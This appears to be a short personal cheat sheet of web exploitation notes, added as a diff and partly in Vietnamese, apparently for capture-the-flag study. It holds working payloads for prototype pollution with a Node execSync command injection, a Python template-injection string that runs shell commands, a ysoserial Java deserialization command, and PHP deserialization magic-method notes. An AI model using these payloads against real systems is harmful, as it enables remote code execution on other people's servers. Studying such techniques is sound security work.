@@ -1,0 +1,25 @@
+---------------------------------prototype pollution
+Content-Type: application/json
+{"password":"admin","__proto__":{"username":"admin"}}
+["require('child_process').execSync('ls -la)"]
+https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
+https://sheon.hashnode.dev/ctf-imaginary-2022-web-category-login-please-write-up
+https://hackmd.io/@taidh/PWN2WIN-2021
+
+----python
+https://viblo.asia/p/ban-da-biet-ve-lo-hong-class-pollution-trong-python-hay-chua-p1-3kY4g5zxLAe
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+--------------------------------------------deserialize
+java -jar ysoserial-all.jar CommonsCollections5 'apt install curl -y' | base64 -w 0 
+Ngoài readObject(), chúng ta cũng nên tìm thêm:
+readResolve()
+toString()
+hashCode()
+finalize()
+---------------php deser
+https://hackmd.io/@Trumpiter/basicvulnweb   --systemclass
+__call() is triggered when invoking inaccessible methods in an object context.
+__sleep() sẽ được gọi khi chúng ta thực hiện serialize() đối tượng
+__wakeup() sẽ được gọi khi chúng ta unserialize() 
+__invoke() sẽ được gọi khi chúng ta sử đối tượng như một hàm. $<name class>(argument or not)
+__get() is utilized for reading data from inaccessible (protected or private) or non-existing properties.
